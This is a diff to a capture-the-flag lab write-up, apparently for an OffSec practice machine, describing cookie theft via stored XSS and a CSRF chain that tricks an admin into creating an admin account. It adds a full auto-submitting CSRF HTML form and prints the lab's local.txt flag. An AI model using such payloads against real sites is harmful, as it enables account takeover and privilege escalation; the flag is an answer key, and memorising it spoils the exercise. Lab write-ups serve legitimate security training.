@@ -27,17 +27,6 @@ Its passing XSRF-TOKEN.
 
 ![register_request](images/register_request.png) 
 
-- Try to create a user without XSRF-TOKEN. You can see it gives 200 OK response.
-
-![create_user_without_XSRF_token](images/create_user_without_XSRF_token.png) 
-
-- Now try to login with the newly created user. Now you can login with admin access. Here you can find the local.txt flag.
-
-![local_txt_flag](images/local_txt_flag.png)
-
-
-### local.txt flag:  f27e43abee7efa566713f9669e361c5f
-
 ## **Using XSS**
 - Register with a guest account and log in to the website.
 
@@ -55,11 +44,12 @@ Use below payload in Book flight form in text area filed.
 
 ![xss_payload](images/xss_payload.png)
 
-Once the form is submited wait for sometime, so when the admin user will visit the page, then our payload will gets executed and will send the admin cookie to our kali machine.
+Once the form is submited wait for sometime, so when the admin user will visit the page, then our payload will gets executed and will send the admin cookie to our kali machine. 
 
 ![steal_admin_cookie](images/steal_admin_cookie.png)
 
 After decoding it using URL, we will get the cookie.
+But due to httponly flag we will not receive the laravel_session cookie, so we can't really use the cookie we received.  
 
 ## **Chaining CSRF attack with XSS**
 - Intercept the register user request. Here you may notice one interesting parameter called : type with value 51. Try to fuzz this value using intruder, which may give us the type for admin role.
@@ -69,8 +59,29 @@ After decoding it using URL, we will get the cookie.
 which means using type=100, the admin account can be created. But with current test user we are we can't create an admin user.
 So we need to use CSRF payload to trick the admin user to execute the request to create an admin account for us.
 
+- Now use register option to login with a guest account.
+- Now go to book flight option.
 - Submit below CSRF payload on text area field
 CSRF Payload:
+
+```
+<html>
+<body onload="document.forms['pwn'].submit()">
+  <form method="POST" action="/loginLogout" accept-charset="UTF-8" name="pwn" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="offsec"/>
+    <input type="hidden" name="password" value="offsec"/>
+    <input type="hidden" name="firstName" value="offsec"/>
+    <input type="hidden" name="lastName" value="offsec"/>
+    <input type="hidden" name="email" value="offsec@offsectest.local"/>
+    <input type="hidden" name="type" value="100"/>
+    <input type="hidden" name="dType" value="isRegister"/>
+  </form>
+</body>
+</html>
+```
+
+OR)
+
 ```
 <html>
   <body>
@@ -95,12 +106,13 @@ CSRF Payload:
 ![csrf_payload](images/csrf_payload.png)
 
 
-
 Once the form is submited wait for sometime, so when the admin user will visit the page, then our CSRF payload will get executed and the admin user account will be created.
 
 - Now login with the newly created account: username-offsec and password-offsec. The local.txt flag can be found there.
 
 ![local_txt_flag](images/local_txt_flag.png)
+
+### local.txt flag:  f27e43abee7efa566713f9669e361c5f
 
 ---
 
